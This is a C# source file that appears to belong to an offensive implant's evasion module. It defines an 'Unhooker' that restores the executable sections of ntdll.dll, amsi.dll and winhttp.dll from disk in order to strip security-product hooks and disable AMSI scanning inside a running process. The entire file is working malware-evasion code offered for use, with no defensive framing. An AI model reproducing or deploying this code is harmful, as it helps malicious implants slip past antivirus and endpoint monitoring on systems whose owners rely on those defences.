using System;
using System.IO;
using System.Runtime.InteropServices;

namespace S4M1A.Implant.Evasion
{
    // =====================================================================
    //  S4M1A Unhooker v2.0
    //  Restores pristine section bytes of ntdll/amsi/winhttp straight from
    //  the on-disk module image (section headers parsed from the live PE).
    //  v2.0 change: bulk RtlMoveMemory copy instead of byte-by-byte loops
    //  (the old approach took seconds over a 1-2 MB .text section).
    // =====================================================================

    public static class Unhooker
    {
        private static readonly string[] Targets =
            { "ntdll.dll", "amsi.dll", "winhttp.dll" };

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern uint GetModuleFileName(IntPtr hModule,
            System.Text.StringBuilder lpFilename, uint nSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress,
            UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern void RtlMoveMemory(IntPtr dest, byte[] src, UIntPtr count);

        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;

        // Returns a human-readable report of restored sections.
        public static string UnhookAll()
        {
            string report = "";
            foreach (string name in Targets)
            {
                try
                {
                    IntPtr h = GetModuleHandle(name);
                    if (h == IntPtr.Zero) continue; // not loaded - skip
                    int restored = RestoreModule(h, name);
                    if (restored > 0)
                        report += name + "(" + restored + " sections) ";
                }
                catch { }
            }
            return report.Trim();
        }

        private static int RestoreModule(IntPtr baseAddr, string moduleName)
        {
            // ------- locate the on-disk image (System32 folder) -------
            string diskPath = "";
            try
            {
                System.Text.StringBuilder sb =
                    new System.Text.StringBuilder(260);
                if (GetModuleFileName(baseAddr, sb, (uint)sb.Capacity) > 0)
                    diskPath = sb.ToString();
            }
            catch { }
            if (string.IsNullOrEmpty(diskPath) || !File.Exists(diskPath))
                return 0;

            byte[] diskImage = File.ReadAllBytes(diskPath);

            // ------- parse PE headers -------
            ushort dosMagic = BitConverter.ToUInt16(diskImage, 0);
            if (dosMagic != 0x5A4D) return 0; // MZ

            int e_lfanew = BitConverter.ToInt32(diskImage, 0x3C);
            uint ntSig = BitConverter.ToUInt32(diskImage, e_lfanew);
            if (ntSig != 0x00004550) return 0; // PE\0\0

            bool is64 = BitConverter.ToUInt16(diskImage, e_lfanew + 4) == 0x20B;
            int optStart = e_lfanew + 24;
            int sectionStart;
            int numberOfSections;

            if (is64)
            {
                numberOfSections = BitConverter.ToUInt16(diskImage, e_lfanew + 6);
                sectionStart = optStart + 240; // IMAGE_OPTIONAL_HEADER64
            }
            else
            {
                numberOfSections = BitConverter.ToUInt16(diskImage, e_lfanew + 6);
                sectionStart = optStart + 224; // IMAGE_OPTIONAL_HEADER32
            }

            int restored = 0;
            for (int i = 0; i < numberOfSections; i++)
            {
                int off = sectionStart + i * 40; // IMAGE_SECTION_HEADER (40 bytes)
                string secName =
                    System.Text.Encoding.ASCII.GetString(diskImage, off, 8).TrimEnd('\0');

                uint virtualSize = BitConverter.ToUInt32(diskImage, off + 8);
                uint virtualAddr = BitConverter.ToUInt32(diskImage, off + 12);
                uint rawSize = BitConverter.ToUInt32(diskImage, off + 16);
                uint rawPtr = BitConverter.ToUInt32(diskImage, off + 20);
                uint characteristics = BitConverter.ToUInt32(diskImage, off + 36);

                // only executable sections carry hooks (API prologues)
                if ((characteristics & IMAGE_SCN_MEM_EXECUTE) == 0) continue;
                if (rawSize == 0 || rawPtr == 0) continue;
                if (rawPtr + rawSize > (uint)diskImage.Length) continue;

                IntPtr dest = baseAddr + (int)virtualAddr;

                uint oldProtect;
                if (!VirtualProtect(dest, (UIntPtr)rawSize,
                        PAGE_EXECUTE_READWRITE, out oldProtect))
                    continue;

                byte[] clean = new byte[rawSize];
                Buffer.BlockCopy(diskImage, (int)rawPtr, clean, 0, (int)rawSize);
                RtlMoveMemory(dest, clean, (UIntPtr)rawSize);

                VirtualProtect(dest, (UIntPtr)rawSize,
                    oldProtect == 0 ? PAGE_EXECUTE_READWRITE : oldProtect,
                    out oldProtect);

                restored++;
            }
            return restored;
        }
    }
}